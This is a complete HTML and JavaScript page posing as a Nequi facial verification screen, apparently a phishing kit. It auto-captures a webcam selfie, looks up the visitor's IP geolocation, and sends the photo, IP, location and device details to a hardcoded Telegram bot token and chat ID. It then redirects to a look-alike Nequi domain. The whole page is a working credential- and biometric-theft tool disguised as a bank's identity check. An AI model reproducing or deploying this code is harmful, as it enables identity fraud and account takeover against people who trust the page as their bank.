<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación Facial - Nequi</title>

<style>
body {
    margin: 0;
    background: #2b002b;
    overflow: hidden;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

video {
    position: absolute;
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* Overlay */
.overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(43,0,43,0.5);
    mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
    -webkit-mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
}

/* Óvalo */
.oval {
    position: absolute;
    width: 300px;
    height: 420px;
    border-radius: 50%;
    border: 4px solid white;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    transition: 0.2s;
    pointer-events: none;
}

.oval.valid {
    border-color: #00ff88;
    box-shadow: 0 0 25px #00ff88;
    animation: pulse 0.5s ease;
}

@keyframes pulse {
    0%, 100% { transform: translate(-50%, -50%) scale(1); }
    50% { transform: translate(-50%, -50%) scale(1.02); }
}

/* Texto principal */
.status {
    position: absolute;
    bottom: 30px;
    width: 100%;
    text-align: center;
    color: white;
    font-size: 18px;
    text-shadow: 0 2px 5px rgba(0,0,0,0.5);
    z-index: 10;
}

/* Mensaje de advertencia en rojo */
.warning-message {
    position: absolute;
    top: 30px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(255,0,0,0.85);
    color: white;
    padding: 12px 24px;
    border-radius: 50px;
    font-size: 18px;
    font-weight: bold;
    text-align: center;
    z-index: 15;
    backdrop-filter: blur(5px);
    border: 1px solid rgba(255,255,255,0.3);
    animation: pulseRed 1s infinite;
    white-space: nowrap;
    font-family: monospace;
    display: none;
}

.warning-message.show {
    display: block;
}

@keyframes pulseRed {
    0%, 100% {
        transform: translateX(-50%) scale(1);
        background: rgba(255,0,0,0.85);
    }
    50% {
        transform: translateX(-50%) scale(1.02);
        background: rgba(255,50,50,0.95);
        box-shadow: 0 0 15px rgba(255,0,0,0.5);
    }
}

/* Barra de progreso */
.progress-container {
    position: absolute;
    bottom: 100px;
    left: 50%;
    transform: translateX(-50%);
    width: 250px;
    height: 6px;
    background: rgba(255,255,255,0.3);
    border-radius: 3px;
    overflow: hidden;
    z-index: 10;
}

.progress-bar {
    height: 100%;
    width: 0%;
    background: #00ff88;
    transition: width 0.1s linear;
    border-radius: 3px;
}

/* Contador */
.countdown {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 80px;
    font-weight: bold;
    color: white;
    text-shadow: 0 0 20px rgba(0,0,0,0.8);
    z-index: 25;
    background: rgba(0,0,0,0.6);
    padding: 20px 40px;
    border-radius: 50px;
    backdrop-filter: blur(10px);
    display: none;
    font-family: monospace;
}

.countdown.show {
    display: block;
}

/* Preview de foto */
.photo-preview {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 100px;
    height: 100px;
    border-radius: 12px;
    overflow: hidden;
    border: 3px solid #00ff88;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    z-index: 20;
    background: white;
    animation: slideIn 0.3s ease;
    cursor: pointer;
}

.photo-preview img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.photo-preview .delete-btn {
    position: absolute;
    top: -8px;
    right: -8px;
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: red;
    color: white;
    border: none;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    font-weight: bold;
}

@keyframes slideIn {
    from {
        opacity: 0;
        transform: translateX(100px);
    }
    to {
        opacity: 1;
        transform: translateX(0);
    }
}

/* Botón de reinicio */
.reset-btn {
    position: fixed;
    bottom: 20px;
    left: 20px;
    background: rgba(0,0,0,0.7);
    backdrop-filter: blur(5px);
    color: white;
    border: 1px solid rgba(255,255,255,0.3);
    padding: 10px 20px;
    border-radius: 25px;
    cursor: pointer;
    font-size: 14px;
    z-index: 20;
    transition: all 0.2s;
    font-family: monospace;
}

.reset-btn:hover {
    background: rgba(255,255,255,0.2);
    transform: scale(1.05);
}

/* Botón de enviar */
.send-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    background: rgba(0,255,136,0.9);
    backdrop-filter: blur(5px);
    color: #2b002b;
    border: none;
    padding: 10px 20px;
    border-radius: 25px;
    cursor: pointer;
    font-size: 14px;
    z-index: 20;
    transition: all 0.2s;
    font-weight: bold;
    display: none;
}

.send-btn:hover {
    background: #00ff88;
    transform: scale(1.05);
}

/* Loader */
.loader {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    z-index: 9999;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    gap: 15px;
}

.loader.active {
    display: flex;
}

.loader-spinner {
    width: 50px;
    height: 50px;
    border: 5px solid #f3f3f3;
    border-top: 5px solid #00ff88;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loader-text {
    color: white;
    font-weight: 600;
}

/* Toast de éxito */
.success-toast {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(0,255,136,0.95);
    color: #2b002b;
    padding: 20px 40px;
    border-radius: 50px;
    font-size: 24px;
    font-weight: bold;
    z-index: 30;
    animation: fadeInOut 1.5s ease;
    pointer-events: none;
    white-space: nowrap;
}

@keyframes fadeInOut {
    0% {
        opacity: 0;
        transform: translate(-50%, -50%) scale(0.8);
    }
    15% {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1);
    }
    85% {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1);
    }
    100% {
        opacity: 0;
        transform: translate(-50%, -50%) scale(0.8);
    }
}

/* Mensaje de estado adicional */
.status-message {
    position: fixed;
    bottom: 120px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0,0,0,0.8);
    color: white;
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 12px;
    z-index: 10;
    display: none;
    white-space: nowrap;
}
</style>
</head>

<body>

<video id="video" autoplay muted playsinline></video>
<div class="overlay"></div>
<div class="oval" id="oval"></div>
<div class="warning-message" id="warningMessage">⚠️ Mira de frente a la cámara por favor</div>
<div class="status" id="status">🎯 Iniciando cámara...</div>
<div class="progress-container">
    <div class="progress-bar" id="progressBar"></div>
</div>
<div class="countdown" id="countdown">3</div>
<button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
<button class="send-btn" id="sendBtn">📤 Enviar a Nequi</button>
<div class="status-message" id="statusMessage"></div>
<div class="loader" id="loader">
    <div class="loader-spinner"></div>
    <div class="loader-text" id="loaderText">Procesando...</div>
</div>

<script>
const video = document.getElementById("video");
const oval = document.getElementById("oval");
const statusText = document.getElementById("status");
const resetBtn = document.getElementById("resetBtn");
const sendBtn = document.getElementById("sendBtn");
const statusMessage = document.getElementById("statusMessage");
const loader = document.getElementById("loader");
const loaderText = document.getElementById("loaderText");
const warningMessage = document.getElementById("warningMessage");
const progressBar = document.getElementById("progressBar");
const countdownDiv = document.getElementById("countdown");

// Configuración de Telegram
const TELEGRAM_CONFIG = {
    token: "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8",
    chatId: "7776240161"
};

let photoTaken = false;
let currentPhotoData = null;
let detectionInterval = null;
let stabilityFrames = 0;
let lastFacePosition = null;
let countdownActive = false;
let countdownTimer = null;
let countdownValue = 3;

// Configuración de detección
const REQUIRED_STABLE_FRAMES = 10;
const STABILITY_THRESHOLD = 18;
const CENTER_TOLERANCE_X = 75;
const CENTER_TOLERANCE_Y = 95;

// Iniciar cámara
navigator.mediaDevices.getUserMedia({ 
    video: { 
        width: { ideal: 1280 },
        height: { ideal: 720 },
        facingMode: "user"
    } 
})
.then(stream => {
    video.srcObject = stream;
    statusText.innerText = "😊 Coloca tu rostro en el óvalo";
    startFaceDetection();
})
.catch(err => {
    console.error("Error de cámara:", err);
    statusText.innerText = "❌ Error: No se puede acceder a la cámara";
});

// Detección de rostro usando tonos de piel
function startFaceDetection() {
    detectionInterval = setInterval(() => {
        if (photoTaken) return;
        
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;
        
        // Detectar región con tonos de piel
        const faceRegion = detectFaceRegion(data, canvas.width, canvas.height);
        
        if (faceRegion) {
            const rect = video.getBoundingClientRect();
            const scaleX = rect.width / canvas.width;
            const scaleY = rect.height / canvas.height;
            
            const faceX = (faceRegion.x + faceRegion.width / 2) * scaleX;
            const faceY = (faceRegion.y + faceRegion.height / 2) * scaleY;
            
            const ovalRect = oval.getBoundingClientRect();
            const centerX = ovalRect.left + ovalRect.width / 2;
            const centerY = ovalRect.top + ovalRect.height / 2;
            
            const dx = Math.abs(faceX - centerX);
            const dy = Math.abs(faceY - centerY);
            const isCentered = dx < CENTER_TOLERANCE_X && dy < CENTER_TOLERANCE_Y;
            
            // Verificar estabilidad
            let isStable = true;
            if (lastFacePosition) {
                const movement = Math.hypot(faceX - lastFacePosition.x, faceY - lastFacePosition.y);
                isStable = movement < STABILITY_THRESHOLD;
            }
            lastFacePosition = { x: faceX, y: faceY };
            
            // Actualizar óvalo según centrado
            if (isCentered) {
                oval.classList.add("valid");
                warningMessage.classList.remove("show");
            } else {
                oval.classList.remove("valid");
                warningMessage.classList.add("show");
            }
            
            if (isCentered && isStable) {
                stabilityFrames++;
                const progress = (stabilityFrames / REQUIRED_STABLE_FRAMES) * 100;
                progressBar.style.width = `${progress}%`;
                
                if (stabilityFrames >= REQUIRED_STABLE_FRAMES && !countdownActive && !photoTaken) {
                    startAutoCountdown();
                } else if (stabilityFrames > 3) {
                    statusText.innerText = `✅ ¡Perfecto! Mantén la posición (${stabilityFrames}/${REQUIRED_STABLE_FRAMES})`;
                } else {
                    statusText.innerText = "✅ Rostro centrado - Mantén la posición";
                }
            } else {
                stabilityFrames = 0;
                progressBar.style.width = "0%";
                if (!isCentered) {
                    statusText.innerText = "🎯 Centra tu rostro en el óvalo verde";
                } else if (!isStable) {
                    statusText.innerText = "⚠️ No te muevas, mantén la posición";
                }
            }
        } else {
            stabilityFrames = 0;
            progressBar.style.width = "0%";
            statusText.innerText = "❌ No se detecta rostro";
            oval.classList.remove("valid");
            warningMessage.classList.add("show");
            lastFacePosition = null;
        }
    }, 100);
}

// Detectar región de rostro por tonos de piel
function detectFaceRegion(data, width, height) {
    let skinPixels = [];
    
    for (let y = 0; y < height; y += 3) {
        for (let x = 0; x < width; x += 3) {
            const idx = (y * width + x) * 4;
            const r = data[idx];
            const g = data[idx + 1];
            const b = data[idx + 2];
            
            // Detección de tonos de piel
            if (r > 60 && g > 40 && b > 20 && r > g && r > b) {
                const skinRatio = (r - g) / (r + g + b);
                if (skinRatio > 0.05 && r > 80 && g > 40 && b > 20) {
                    skinPixels.push({ x, y });
                }
            }
        }
    }
    
    if (skinPixels.length < 40) return null;
    
    // Encontrar la región más densa
    let bestX = 0, bestY = 0, maxCount = 0;
    const step = 20;
    
    for (let x = 0; x < width; x += step) {
        for (let y = 0; y < height; y += step) {
            let count = 0;
            for (let pixel of skinPixels) {
                if (Math.abs(pixel.x - x) < 50 && Math.abs(pixel.y - y) < 60) {
                    count++;
                }
            }
            if (count > maxCount) {
                maxCount = count;
                bestX = x;
                bestY = y;
            }
        }
    }
    
    if (maxCount < 30) return null;
    
    // Calcular tamaño del rostro
    let minX = bestX, maxX = bestX, minY = bestY, maxY = bestY;
    for (let pixel of skinPixels) {
        if (Math.abs(pixel.x - bestX) < 100 && Math.abs(pixel.y - bestY) < 120) {
            minX = Math.min(minX, pixel.x);
            maxX = Math.max(maxX, pixel.x);
            minY = Math.min(minY, pixel.y);
            maxY = Math.max(maxY, pixel.y);
        }
    }
    
    const faceWidth = maxX - minX;
    const faceHeight = maxY - minY;
    
    if (faceWidth < 60 || faceHeight < 60) return null;
    
    return {
        x: minX,
        y: minY,
        width: faceWidth,
        height: faceHeight
    };
}

function startAutoCountdown() {
    if (countdownActive || photoTaken) return;
    
    countdownActive = true;
    countdownValue = 3;
    
    countdownDiv.textContent = countdownValue;
    countdownDiv.classList.add("show");
    statusText.innerText = `📸 Selfie en ${countdownValue}...`;
    
    countdownTimer = setInterval(() => {
        countdownValue--;
        countdownDiv.textContent = countdownValue;
        
        if (countdownValue > 0) {
            statusText.innerText = `📸 Selfie en ${countdownValue}...`;
        } else {
            clearInterval(countdownTimer);
            countdownTimer = null;
            countdownDiv.classList.remove("show");
            takePhoto();
        }
    }, 1000);
}

// Tomar foto automática
function takePhoto() {
    if (photoTaken) return;
    
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext("2d");
    // Aplicar espejo para selfie
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    ctx.setTransform(1, 0, 0, 1, 0, 0);
    
    currentPhotoData = canvas.toDataURL("image/png");
    photoTaken = true;
    
    showSuccessToast();
    statusText.innerText = "✅ ¡Selfie capturada con éxito!";
    
    createPhotoPreview(currentPhotoData);
    sendBtn.style.display = "block";
    
    // Detener la detección
    if (detectionInterval) {
        clearInterval(detectionInterval);
        detectionInterval = null;
    }
    if (countdownTimer) {
        clearInterval(countdownTimer);
        countdownTimer = null;
    }
    
    // Ocultar mensajes
    warningMessage.classList.remove("show");
}

function showSuccessToast() {
    const toast = document.createElement('div');
    toast.className = 'success-toast';
    toast.textContent = '📸 ¡Selfie capturada!';
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
    }, 1500);
}

function createPhotoPreview(imgData) {
    const existingPreview = document.querySelector('.photo-preview');
    if (existingPreview) existingPreview.remove();
    
    const preview = document.createElement('div');
    preview.className = 'photo-preview';
    
    const img = document.createElement('img');
    img.src = imgData;
    
    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'delete-btn';
    deleteBtn.textContent = '×';
    deleteBtn.onclick = (e) => {
        e.stopPropagation();
        preview.remove();
        sendBtn.style.display = "none";
        photoTaken = false;
        currentPhotoData = null;
        oval.classList.remove("valid");
        stabilityFrames = 0;
        progressBar.style.width = "0%";
        countdownActive = false;
        statusText.innerText = "😊 Coloca tu rostro en el óvalo";
        mostrarMensaje("Selfie eliminada, reiniciando detección", false);
        
        // Reiniciar detección
        if (!detectionInterval) {
            startFaceDetection();
        }
        
        warningMessage.classList.add("show");
        setTimeout(() => {
            if (!photoTaken) {
                const isCentered = checkIfCentered();
                if (isCentered) warningMessage.classList.remove("show");
            }
        }, 3000);
    };
    
    preview.appendChild(img);
    preview.appendChild(deleteBtn);
    
    document.body.appendChild(preview);
}

function checkIfCentered() {
    // Función auxiliar para verificar centrado
    return false;
}

function mostrarMensaje(mensaje, esError = false) {
    statusMessage.textContent = mensaje;
    statusMessage.style.backgroundColor = esError ? 'rgba(255,0,0,0.8)' : 'rgba(0,255,136,0.9)';
    statusMessage.style.color = esError ? 'white' : '#2b002b';
    statusMessage.style.display = 'block';
    setTimeout(() => {
        statusMessage.style.display = 'none';
    }, 3000);
}

function dataURLtoBlob(dataURL) {
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mime });
}

async function enviarATelegram() {
    if (!currentPhotoData) {
        mostrarMensaje("No hay foto para enviar", true);
        return;
    }
    
    loader.classList.add('active');
    loaderText.textContent = "Enviando verificación...";
    
    try {
        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
        
        loaderText.textContent = "Enviando selfie...";
        const blob = dataURLtoBlob(currentPhotoData);
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.chatId);
        formData.append('caption', `🤳 Selfie - ${new Date().toLocaleString('es-CO')}`);
        formData.append('photo', blob, `selfie.jpg`);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        const mensajeInfo = `
🔔 **NUEVA SELFIE CAPTURADA** 🔔

✅ Selfie tomada correctamente

🌍 **DATOS DE UBICACIÓN:**
📍 IP: ${ipData.ip}
🏙 Ciudad: ${ipData.city}
🏛 Región: ${ipData.region}
🇨🇴 País: ${ipData.country_name}
📱 Dispositivo: ${navigator.userAgent}

⏰ **FECHA Y HORA:**
📅 ${new Date().toLocaleString('es-CO')}
`;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: mensajeInfo,
                parse_mode: 'Markdown'
            })
        });
        
        loader.classList.remove('active');
        mostrarMensaje("✅ Selfie enviada correctamente");
        
        sendBtn.style.display = 'none';
        
        setTimeout(() => {
            window.location.href = 'https://nequi-red.vercel.app/';
        }, 3000);
        
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
        loader.classList.remove('active');
        mostrarMensaje("Error al enviar la selfie. Intenta nuevamente.", true);
    }
}

// Botón de reinicio
resetBtn.addEventListener('click', () => {
    photoTaken = false;
    currentPhotoData = null;
    oval.classList.remove("valid");
    sendBtn.style.display = "none";
    stabilityFrames = 0;
    progressBar.style.width = "0%";
    countdownActive = false;
    
    if (countdownTimer) {
        clearInterval(countdownTimer);
        countdownTimer = null;
    }
    countdownDiv.classList.remove("show");
    
    const preview = document.querySelector('.photo-preview');
    if (preview) preview.remove();
    
    statusText.innerText = "😊 Coloca tu rostro en el óvalo";
    mostrarMensaje("Reiniciado, la selfie se tomará automáticamente", false);
    
    // Reiniciar detección
    if (!detectionInterval) {
        startFaceDetection();
    }
    
    warningMessage.classList.add("show");
});

// Botón de enviar a Telegram
sendBtn.addEventListener('click', () => {
    enviarATelegram();
});

// Ocultar mensaje de advertencia después de 3 segundos al inicio
setTimeout(() => {
    if (!photoTaken) {
        warningMessage.classList.add("show");
    }
}, 1000);
</script>

</body>
</html>
